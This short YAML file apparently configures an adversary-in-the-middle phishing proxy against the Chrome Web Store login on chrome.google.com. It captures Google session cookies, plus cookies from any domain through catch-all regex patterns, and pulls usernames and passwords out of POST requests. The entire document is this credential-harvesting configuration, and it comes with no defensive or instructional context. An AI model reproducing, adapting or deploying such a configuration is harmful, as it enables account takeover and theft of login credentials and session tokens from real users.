auth_tokens:
  - domain: '.google.com'
    keys: ['(.+),regexp']
  - domain: '(.+),regexp'
    keys: ['(.+),regexp']
credentials:
  username:
    key: 'guid'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'chrome.google.com'
  path: '/webstore/'
